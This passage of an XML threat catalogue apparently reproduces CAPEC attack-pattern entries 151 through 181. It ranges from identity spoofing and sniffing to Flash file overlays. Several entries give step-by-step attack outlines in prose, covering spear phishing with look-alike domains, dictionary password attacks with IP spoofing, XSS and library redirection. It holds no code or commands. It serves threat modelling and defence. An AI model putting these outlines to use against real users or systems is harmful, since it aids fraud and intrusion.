  <description>An attacker exploits well known locations for resources for the purposes of undermining the security of the target. In many, if not most, systems, files and resources are organized in the same tree structure. This can be useful for attackers because they often know where to look for resources or files that are necessary for attacks. Even when the precise location of a targeted resource may know be known, naming conventions may indicate a small area of the target machine's file tree where the resources are typically located. For example, configuration files are normally stored in the /etc director on Unix systems. Attackers can take advantage of this to commit other types of attacks.</description>
</threat>
<threat label="CAPEC-151" name="Identity Spoofing (Impersonation)" type="Standard" reference="CAPEC">
  <description>An attacker crafts a message that masquerades as a message from a principal other than the actual message sender. This may involve having the attacker create content for the purpose of making it appear to originate from a legitimate &quot;spoofed&quot; source. Phishing and Pharming attacks often attempt to do this so that their attempts to gather sensitive information appear to come from a legitimate source. Alternatively, an attacker may intercept a message from a legitimate sender and attempt to make it look like the message comes from them without changing its content. The latter form of this attack can be used to hijack credentials from legitimate users. This attack need not be limited to transmitted messages - any resource that is associated with an identity (for example, a file with a signature) can be the target of an attack where the attacker attempts to change the apparent source. This attack differs from Content Spoofing attacks since, in Content Spoofing, the attacker does not wish to change the apparent source of the message but instead wishes to change what the source appears to say. In an Identity Spoofing attack, the attacker is attempting to change the apparent source of the content.</description>
</threat>
<threat label="CAPEC-153" name="Input Data Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker exploits a weakness in input validation by controlling the format, structure, and composition of data to an input-processing interface. By supplying input of a non-standard or unexpected form an attacker can advesely impact the security of the target. For example, using a different character encoding might cause dangerous text to be treated as safe text. Alternatively, the attacker may use certain flags, such as file extensions, to make a target application believe that provided data should be handled using a certain interpreter when the data is not actually of the appropriate type. This can lead to bypassing protection mechanisms, forcing the target to use specific components for input processing, or otherwise causing the user's data to be handled differently than might otherwise be expected. This attack differs from Variable Manipulation in that Variable Manipulation attempts to subvert the target's processing through the value of the input while Input Data Manipulation seeks to control how the input is processed.</description>
</threat>
<threat label="CAPEC-154" name="Resource Location Attacks" type="Standard" reference="CAPEC">
  <description>An attacker utilizes discovered or crafted file path information for the purpose of locating and exploiting a security sensitive resource. This category of attack involves the paths used by an application to store or retrieve resources. Specifically, attacks in this category involve manipulating the path, causing the application to look in location unintended by the application maintainer, or determining the paths through prediction or lookup. This differs from File Manipulation attacks in which the contents of the files are affected or where the files themselves are physically moved. Instead, this attack simply concerns itself with the paths used to find or create resources.</description>
</threat>
<threat label="CAPEC-155" name="Screen Temporary Files for Sensitive Information" type="Standard" reference="CAPEC">
  <description>An attacker exploits the temporary, insecure storage of information by monitoring the content of files used to store temp data during an application's routine execution flow. Many applications use temporary files to accelerate processing or to provide records of state across multiple executions of the application. Sometimes, however, these temporary files may end up storing sensitive information. By screening an application's temporary files, an attacker might be able to discover such sensitive information. For example, web browsers often cache content to accelerate subsequent lookups. If the content contains sensitive information then the attacker could recover this from the web cache.</description>
</threat>
<threat label="CAPEC-157" name="Sniffing Attacks" type="Standard" reference="CAPEC">
  <description>An attacker monitors information transmitted between logical or physical nodes of a network. The attacker need not be able to prevent reception or change content but must simply be able to observe and read the traffic. The attacker might precipitate or indirectly influence the content of the observed transaction, but the attacker is never the intended recipient of the information. Any transmission medium can theoretically be sniffed if the attacker can listen to the contents between the sender and recipient.</description>
</threat>
<threat label="CAPEC-158" name="Sniffing Information Sent Over Public/multicast Networks" type="Standard" reference="CAPEC">
  <description>An attacker monitoring network traffic between nodes of a public or multicast network. The attacker need not be able to prevent reception or change content but must simply be able to observe and read the traffic. The attacker might precipitate or indirectly influence the content of the observed transaction, but the attacker is never the intended recipient of the information. This differs from other sniffing attacks in that it is over a public network rather via some other communications channel, such as radio.</description>
</threat>
<threat label="CAPEC-159" name="Redirect Access to Libraries" type="Standard" reference="CAPEC">
  <description>An attacker exploits the execution flow of a call to an external library to point to an attacker supplied library or code base, allowing the attacker to compromise the application or server via the execution of unauthorized code. An application typically makes calls to functions that are a part of libraries external to the application. These libraries may be part of the operating system or they may be third party libraries. If an attacker can redirect an application's attempts to access these libraries to other libraries that the attacker supplies, the attacker will be able to force the targeted application to execute arbitrary code. This is especially dangerous if the targeted application has enhanced privileges. Access can be redirected through a number of techniques, including the use of symbolic links, search path modification, and relative path manipulation.An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.The attacker uses a tool such as the OSX “otool” utility or manually probes whether the target application uses dynamically linked libraries.The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.The target application uses dynamically linked libraries.The attacker can redirect or control access to files in areas leveraged by the target.The attacker can modify the entries in the configuration files to the libraries the attacker crafted.The attacker cannot modify the configuration files entries. The attacker may still be able to redirect access to libraries using other techniques such as using symbolic links.The application does not use dynamically linked libraries.The attacker uses knowledge gained in the Explore phase to craft malicious libraries that he will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using “sleep(2)” and “usleep()” to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.The attacker redirects the target to the malicious libraries he crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.The attacker modifies the entries in the configuration files pointing to the malicious libraries he crafted.The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries he crafted.The attacker leverages file search path order issues to redirect the target to access the malicious libraries he crafted.</description>
</threat>
<threat label="CAPEC-16" name="Dictionary-based Password Attack" type="Detailed" reference="CAPEC">
  <description>An attacker tries each of the words in a dictionary as passwords to gain access to the system via some user's account. If the password chosen by the user was a word within the dictionary, this attack will be successful (in the absence of other mitigations). This is a specific instance of the password brute forcing attack pattern.Determine the password policies of the target application/system.Determine minimum and maximum allowed password lengths.Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).Passwords are used in the application/systemPasswords are not used in the application/system.Pick the dictionaries to be used in the attack (e.g. different languages, specific terminology, etc.)Select dictionary based on particular users' preferred languages.Select dictionary based on the application/system's supported languages.Determine username(s) whose passwords to crack.Obtain username(s) by sniffing network packets.Obtain username(s) by querying application/system (e.g. if upon a failed login attempt, the system indicates whether the entered username was valid or not)Obtain usernames from filesystem (e.g. list of directories in C:\Documents and Settings\ in Windows, and list in /etc/passwd in UNIX-like systems)Remote application or system provides no indication regarding whether a given username is valid or not.Use a password cracking tool that will leverage the dictionary to feed passwords to the system and see if they work.Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).Try common combinations of words in the dictionary, as well as common misspellings of the combinations as passwords for the chosen username(s).Application/system does not use password authentication.Many invalid login attempts are coming from the same machine (same IP address) or for the same log in name. The login attempts use passwords that are dictionary words.Employ IP spoofing to make it seem like login attempts are coming from different machines.</description>
</threat>
<threat label="CAPEC-160" name="Programming to included script-based APIs" type="Standard" reference="CAPEC">
  <description>Some APIs support scripting instructions as arguments. Methods that take scripted instructions (or references to scripted instructions) can be very flexible and powerful. However, if an attacker can specify the script that serves as input to these methods they can gain access to a great deal of functionality. For example, HTML pages support &lt;script&lt; tags that allow scripting languages to be embedded in the page and then interpreted by the receiving web browser. If the content provider is malicious, these scripts can compromise the client application. Some applications may even execute the scripts under their own identity (rather than the identity of the user providing the script) which can allow attackers to perform activities that would otherwise be denied to them.</description>
</threat>
<threat label="CAPEC-161" name="Infrastructure Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker exploits characteristics of the infrastructure of a network entity in order to perpetrate attacks or information gathering on network objects or effect a change in the ordinary information flow between network objects. Most often, this involves manipulation of the routing of network messages so, instead of arriving at their proper destination, they are directed towards an entity of the attacker's choosing, usually a server controlled by the attacker. The victim is often unaware that their messages are not being processed correctly. For example, a targeted client may believe they are connecting to their own bank but, in fact, be connecting to a Pharming site controlled by the attacker which then collects the user's login information in order to hijack the actual bank account.</description>
</threat>
<threat label="CAPEC-162" name="Manipulating hidden fields to change the normal flow of transactions (eShoplifting)" type="Standard" reference="CAPEC">
  <description>An attacker exploits a weakness in the server's trust of client-side processing by modifying data on the client-side, such as price information, and then submitting this data to the server to effect a change in the state of an ordinary transaction. eShoplifting is a data manipulation attack against an on-line merchant during a purchasing transaction. The manipulation of price, discount or quantity fields in the transaction message allows the attacker to acquire items at a lower cost than the merchant intended. The attacker performs a normal purchasing transaction but edits hidden fields within the HTML form response that store price or other information to give themselves a better deal. The merchant then uses the modified pricing information in calculating the cost of the selected items.</description>
</threat>
<threat label="CAPEC-163" name="Spear Phishing" type="Standard" reference="CAPEC">
  <description>An attacker targets a specific user or group with a Phishing (CAPEC-98) attack tailored to a category of users in order to have maximum relevance and deceptive capability. Spear Phishing is an enhanced version of the Phishing attack targeted to a specific user or group. The quality of the targeted email is usually enhanced by appearing to come from a known or trusted entity. If the email account of some trusted entity has been compromised the message may be digitally signed. The message will contain information specific to the targeted users that will enhance the probability that they will follow the URL to the compromised site. For example, the message may indicate knowledge of the targets employment, residence, interests, or other information that suggests familiarity. As soon as the user follows the instructions in the message, the attack proceeds as a standard Phishing attack.An attacker collects useful contextual detailed information about the targeted user or organization in order to craft a more deceptive and enticing message to lure the target into responding.Conduct web searching research of target.Identify trusted associates, colleagues and friends of target.Utilize social engineering attack patterns such as Pretexting.Collect social information via dumpster diving.Collect social information via traditional sources.Collect social information via Non-traditional sources.This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L).Optionally obtain a legitimate SSL certificate for the new domain name.An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that he or she is trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.Use spidering software to get copy of web pages on legitimate site.Manually save copies of required web pages from legitimate site.Create new web pages that have the legitimate site's look at feel, but contain completely new content.Once the attacker has his website which duplicates a legitimate website, he needs to build very custom user related information in it. For example, he could create multiple variants of the website which would target different living area users by providing information such as local news, local weather, etc. so that the user believes this is a new feature from the website.Integrate localized information in the web pages created to duplicate the original website. Those localized information could be dynamically generated based on unique key or IP address of the future victim.An attacker sends a message (typically an e-mail) to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the message is coming from a legitimate entity trusted by the victim or with which the victim or does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.Place phishing link in post to online forum.Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.Log in to the legitimate site using another user's supplied credentials.</description>
</threat>
<threat label="CAPEC-164" name="Mobile Phishing (aka MobPhishing)" type="Standard" reference="CAPEC">
  <description>An attacker targets mobile phone users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Mobile Phishing is a variation on the Phishing social engineering technique where the attack is initiated via mobile texting rather than email. The user is enticed to provide information or go to a compromised web site via a text message. Apart from the manner in which the attack is initiated, the attack proceeds as a standard Phishing attack.</description>
</threat>
<threat label="CAPEC-165" name="File Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker modifies file contents or attributes (such as extensions or names) of files in a manner to cause incorrect processing by an application. Attackers use this class of attacks to cause applications to enter unstable states, overwrite or expose sensitive information, and even execute arbitrary code with the application's privileges. This class of attacks differs from attacks on configuration information (even if file-based) in that file manipulation causes the file processing to result in non-standard behaviors, such as buffer overflows or use of the incorrect interpreter. Configuration attacks rely on the application interpreting files correctly in order to insert harmful configuration information. Likewise, resource location attacks rely on controlling an application's ability to locate files, whereas File Manipulation attacks do not require the application to look in a non-default location, although the two classes of attacks are often combined.</description>
</threat>
<threat label="CAPEC-166" name="Force the System to Reset Values" type="Standard" reference="CAPEC">
  <description>An attacker forces the target into a previous state in order to leverage potential weaknesses in the target dependent upon a prior configuration or state-dependent factors. Even in cases where an attacker may not be able to directly control the configuration of the targeted application, they may be able to reset the configuration to a prior state since many applications implement reset functions. Since these functions are usually intended as emergency features to return an application to a stable configuration if the current configuration degrades functionality, they may not be as strongly secured as other configuration options. The resetting of values is dangerous as it may enable undesired functionality, disable services, or modify access controls. At the very least this is a nuisance attack since the administrator will need to re-apply their configuration. At worst, this attack can open avenues for powerful attacks against the application, and, if it isn't obvious that the configuration has been reset, these vulnerabilities may be present a long time before they are notices.</description>
</threat>
<threat label="CAPEC-167" name="Lifting Sensitive Data from the Client" type="Standard" reference="CAPEC">
  <description>An attacker examines an available client application for the presence of sensitive information. This information may be stored in configuration files, embedded within the application itself, or stored in other ways. Sensitive information may include long-term keys, passwords, credit card or financial information, and other private material that the client uses in its interactions with the server. While servers are (hopefully) protected with professional security administrators, most users may be less skilled at protecting their clients. As a result, the user client may represent a weak link that an attacker can exploit. If an attacker can gain access to a client installation, they may be able to detect and lift sensitive information that could be used directly (such as financial information), or allow the attacker to subvert future communication between the client and the server. In some cases, it may not even be necessary to gain access to another user's installation - if all instances of the client software are embedded with the same sensitive information (for example, long term keys for communication with the server) then the attacker must simply find a way to gain their own copy of the client in order to perform this attack.</description>
</threat>
<threat label="CAPEC-168" name="Windows ::DATA Alternate Data Stream" type="Standard" reference="CAPEC">
  <description>An attacker exploits the functionality of Microsoft NTFS Alternate Data Streams (ADS) to underminie system security. ADS allows multiple &quot;files&quot; to be stored in one directory entry referenced as filename:streamname. One or more alternate data streams may be stored in any file or directory. Normal Microsoft utilities do not show the presence of an ADS stream attached to a file. The additional space for the ADS is not recorded in the displayed file size. The additional space for ADS is accounted for in the used space on the volume. An ADS can be any type of file. ADS are copied by standard Microsoft utilities between NTFS volumes. ADS can be used by an attacker or intruder to hide tools, scripts, and data from detection by normal system utilities. Many anti-virus programs do not check for or scan ADS. Windows Vista does have a switch (-R) on the command line DIR command that will display alternate streams.</description>
</threat>
<threat label="CAPEC-169" name="Footprinting" type="Standard" reference="CAPEC">
  <description>An attacker engages in probing and exploration activity to identify constituents and properties of the target. Footprinting is a general term to describe a variety of information gathering techniques, often used by attackers in preparation for some attack. It consists of using tools to learn as much as possible about the composition, configuration, and security mechanisms of the targeted application, system or network. Information that might be collected during a footprinting effort could include open ports, applications and their versions, network topology, and similar information. While footprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.The attacker examines the website information and source code of the website and uses automated tools to get as much information as possible about the system and organization.Open Source Footprinting: Examine the website about the organization and skim through the webpage's HTML source to look for comments.Network Enumeration: Perform various queries (Registrar Query, Organizational Query, Domain Query, Network Query, POC Query) on the many whois databases found on the internet to identify domain names and associated networks.DNS Interrogation: Once basic information is gathered the attack could begin to query DNS.Other Techniques: Use ping sweep, TCP scan, UDP scan, OS Identification various techniques to gain more information about the system and network.The response contains sensitive information such as ports open, network block, server version etc.The response does not contain sensitive information about the system and network.</description>
</threat>
<threat label="CAPEC-17" name="Accessing, Modifying or Executing Executable Files" type="Standard" reference="CAPEC">
  <description>An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.Enables attacker to execute server side code with any commands that the program owner has privileges to.</description>
</threat>
<threat label="CAPEC-170" name="Web Server/Application Fingerprinting" type="Standard" reference="CAPEC">
  <description>An attacker sends a series of probes to a web server or application in order to elicit version-dependent and type-dependent behavior that assists in identifying the target. An attacker could learn information such as software versions, error pages, and response headers, variations in implementations of the HTTP protocol, directory structures, and other similar information about the targeted service. This information can then be used by an attacker to formulate a targeted attack plan. While web server/application fingerprinting is not intended to be damaging (although certain activities, such as network scans, can sometimes cause disruptions to vulnerable applications inadvertently) it may often pave the way for more damaging attacks.Use automated tools or send web server specific commands to web server and wait for server’s response.Use automated tools or send web server specific commands to web server and then receive server’s response.HTTP response headers contain fingerprinting sensitive fields indicating server’s vendors and versions.HTTP response headers do not contain fingerprinting sensitive fields indicating server’s vendors and versions.Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.Send bad requests or requests of nonexistent pages to the server.Attacker takes existing automated tools to recognize the type and the version of the web server in use.Find different inner reordering of headers in HTTP response due to different versions of the server.Every server answers to a Bad request in a different way due to different versions of the server.Find signatures of web servers in database of automated tools.HTTP response headers all look like identical.After the web server platform software has been identified, the attacker start to identify web application technologies such as ASP, .NET, PHP and Java on the server.Examine the file name extensions in URL, for example .php indicates PHP script interfaced with Apache server.Examine the HTTP Response Headers. This may leak information about software signaturesExamine Cookies that may contain server’s software information.Check error pages.File name extensions can be found in the URL.HTTP Response headers show software version.Cookies leak information for server’s version.From error messages, the stack trace of errors and exceptions may also explicitly tell application software information.Determining the database engine type can assist attackers’ attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.Use tools to send bogus SQL query to the server and check error pages.Get error messages from SQL response.No error messages.Leakage server’s information.</description>
</threat>
<threat label="CAPEC-171" name="Variable Manipulation" type="Standard" reference="CAPEC">
  <description>An attacker manipulates variables used by an application to perform a variet of possible attacks. This can either be performed through the manipulation of function call parameters or by manipulating external variables, such as environment variables, that are used by an application. Changing variable values is usually undertaken as part of another attack; for example, a path traversal (inserting relative path modifiers) or buffer overflow (enlarging a variable value beyond an application's ability to store it).</description>
</threat>
<threat label="CAPEC-173" name="Action Spoofing" type="Standard" reference="CAPEC">
  <description>An attacker is able to disguise one action for another and therefore trick a user into initiating one type of action when they intend to initiate a different action. For example, a user might be led to believe that clicking a button will submit a query, but in fact it downloads software. Attackers may perform this attack through social means, such as by simply convincing a victim to perform the action or relying on a user's natural inclination to do so, or through technical means, such as a clickjacking attack where a user sees one interface but is actually interacting with a second, invisible, interface.</description>
</threat>
<threat label="CAPEC-174" name="Flash Parameter Injection" type="Standard" reference="CAPEC">
  <description>An attacker injects values to global parameters into a Flash movie embedded in an HTML document. These injected parameters are controlled through arguments in the URL used to access the embedding HTML document. As such, this is a form of HTTP parameter injection, but the abilities granted to the Flash document (such as access to a page's document model, including associated cookies) make this attack more flexible. The injected parameters can allow the attacker to control other objects within the Flash movie as well as full control over the parent document's DOM model.Using a browser or an automated tool, an attacker records all instances of HTML documents that have embedded Flash movies. If there is an embedded Flash movie, he lists how to pass global parameters to the Flash movie from the embedding object.Use an automated tool to record all instances of URLs which have embedded Flash movies and list the parameters passing to the Flash movie.Use a browser to manually explore the website to see whether the HTML document has embedded Flash movies or not and list the parameters passing to the Flash movie.The HTML document has embedded Flash movies.The HTML file doesn’t appear to contain Flash movies, but Ajax request seems possible and could insert Flash movies.Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase, the attack attempts to use various techniques such as DOM based, reflected, flashvars, persistent attacks depending on the type of parameter passed to the embedded Flash movie.When the JavaScript 'document.location' variable is used as part of parameter, inject ‘#’ and payload into the parameter in the URL.When the name of the Flash movie is exposed as a form or a URL parameter, the attacker injects ‘?’ and payload after the movie name in the URL to overrides some global value.When the arguments passed in the 'flashvars' attributes, the attacker injects ‘&amp;’ and payload in the URL.If some of the attributes of the &lt;object&gt; tag are received as parameters, the 'flashvars' attribute is injected into the &lt;object&gt; tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur, with malicious code being injected into the Flash file and executed, every time the Flash movie is loaded.The injected parameters can allow the attacker to get full control over the parent document's DOM model as well as other objects within the Flash movie.</description>
</threat>
<threat label="CAPEC-175" name="Code Inclusion" type="Standard" reference="CAPEC">
  <description>An attacker exploits a weakness in input validation on the target to force arbitrary code to be retrieved from a remote location and executed. This differs from script injection in that script injection involves the direct inclusion of scripting code while code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application. One example of this sort of attack is PHP file include attacks where the parameter of an include() function is set by a variable that an attacker is able to control. The result is that arbitrary code could be loaded into the PHP application and executed.</description>
</threat>
<threat label="CAPEC-176" name="Configuration/Environment manipulation" type="Standard" reference="CAPEC">
  <description>An attacker manipulates files or settings external to a target application which affect the behavior of that application. For example, many applications use external configuration files and libraries - modification of these entities or otherwise affecting the application's ability to use them would constitute a configuration/environment manipulation attack.</description>
</threat>
<threat label="CAPEC-177" name="Create files with the same name as files protected with a higher classification" type="Standard" reference="CAPEC">
  <description>An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attacker's file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.</description>
</threat>
<threat label="CAPEC-178" name="Cross-Site Flashing" type="Standard" reference="CAPEC">
  <description>An attacker is able to trick the victim into executing a Flash document that passes commands or calls to a Flash player browser plugin, allowing the attacker to exploit native Flash functionality in the client browser. This attack pattern occurs where an attacker can provide a crafted link to a Flash document (SWF file) which, when followed, will cause additional malicious instructions to be executed. The attacker does not need to serve or control the Flash document. The attack takes advantage of the fact that Flash files can reference external URLs. If variables that serve as URLs that the Flash application references can be controlled through parameters, then by creating a link that includes values for those parameters, an attacker can cause arbitrary content to be referenced and possibly executed by the targeted Flash application.Using a browser or an automated tool, an attacker records all instances of URLs (or partial URL such as domain) passed to a flash file (SWF).Use an automated tool to record the variables passed to a flash file.Use a browser to manually explore the website and analyze how the flash file receive variables, e.g. JavaScript using SetVariable/GetVariable, HTML FlashVars param tag, etc.Use decompilers to retrieve the flash source code and record all user-controllable variables passed to a loadMovie* directive.A URL is passed as parameter to a flash file (SWF).No variable appear on the URL. Even though none appear, the flash movie may still use them if they are provided.Application doesn’t use variable to specify what URL to load remote flash movies from.The attacker makes use of a remotely available flash file (SWF) that generates a uniquely identifiable output when executed inside the targeted flash file.Modify the variable of the SWF file that contains the remote movie URL to the attacker controlled flash file.The attacker’s flash movie is being executed in the targeted movie.The targeted flash movie doesn’t appear to allow the inclusion of flash movies from untrusted domains (specified in the crossdomain.xml or in the flash movie itself).As the attacker succeeds in exploiting the vulnerability, he targets the content of the flash application to steal variable content, password, etc.Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and loaded by the victim browser’s flash plugin and sends document information to the attacker.Develop malicious Flash application that is injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the flash application to execute appropriately.When the attacker targets the current flash application, he can choose to inject JavaScript in the client’s DOM and therefore execute cross-site scripting attack.Develop malicious JavaScript that is injected from the rogue flash movie to the targeted flash application through vectors identified during the Experiment Phase and loaded by the victim's browser.Client web browser may be used to steal session data, passwords and other information which transit through the vulnerable flash application.</description>
</threat>
<threat label="CAPEC-179" name="Discovering, querying, and finally calling micro-services, such as w/ AJAX" type="Standard" reference="CAPEC">
  <description>An attacker is able to discover and query Micro-services at a web location and thereby expose the Micro-services to further exploitation by gathering information about their implementation and function. Micro-services in web pages allow portions of a page to connect to the server and update content without needing to cause the entire page to update. This allows user activity to change portions of the page more quickly without causing disruptions elsewhere. However, these micro-services may not be subject to the same level of security review as other forms of content. For example, a micro-service that posts requests to a server that are turned into SQL queries may not adequately protect against SQL-injection attacks. As a result, micro-services may provide another vector for a range of attacks. It should be emphasized that the presence of micro-services does not necessarily make a site vulnerable to attack, but they do provide additional complexity to a web page and therefore may contain vulnerabilities that support other attack patterns.</description>
</threat>
<threat label="CAPEC-18" name="Embedding Scripts in Nonscript Elements" type="Standard" reference="CAPEC">
  <description>This attack is a form of Cross-Site Scripting (XSS) where malicious scripts are embedded in elements that are not expected to host scripts such as image tags (&lt;img&gt;), comments in XML documents (&lt; !-CDATA-&gt;), etc. These tags may not be subject to the same input validation, output validation, and other content filtering and checking routines, so this can create an opportunity for an attacker to tunnel through the application's elements and launch a XSS attack through other elements.As with all remote attacks, it is important to differentiate the ability to launch an attack (such as probing an internal network for unpatched servers) and the ability of the remote attacker to collect and interpret the output of said attack.Using a browser or an automated tool, an attacker records all entry points for inputs that happen to be reflected in a client-side non-script element. These non-script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.Use a spidering tool to follow and record all non static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.Use a proxy tool to record all links visited during a manual traversal of the web application.Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.At least one input is reflected in a non-script element.Using URL rewriting, parameters may be part of the URL path and still used in a non-script element.No parameters appear to be used on the current page. Even though none appear, the web application may still use them if they are provided.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.The attacker uses the entry points gathered in the &quot;Explore&quot; phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).Use a proxy tool to record results of the created requests.User-controllable input is output back to the browserOutput to the browser is not encoded to remove executable scripting syntax.As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the website.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Enables attacker to execute scripts to launch attacks on remote client machine and environment</description>
</threat>
<threat label="CAPEC-180" name="Exploiting Incorrectly Configured Access Control Security Levels" type="Standard" reference="CAPEC">
  <description>An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, &quot;Accessing Functionality Not Properly Constrained by ACLs&quot; in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.The attacker surveys the target application, possibly as a valid and authenticated user.Spider the web site for all available links.Brute force to guess all function names/action with different privileges.Access control mechanism is present in the system.Operating modes with different privileges are present in the system.The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.The attacker attempts authenticated access to targeted functions and data.The attacker attempts unauthenticated access to targeted functions and data.The attacker attempts indirect and side channel access to targeted functions and data.The attacker executes the function or accesses the data indentified in the Explore phase bypassing the access control.The attacker executes the function or accesses the data not authorized to him.</description>
</threat>
<threat label="CAPEC-181" name="Flash File Overlay" type="Standard" reference="CAPEC">
  <description>An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.</description>
</threat>
<threat label="CAPEC-182" name="Flash  Injection" type="Standard" reference="CAPEC">
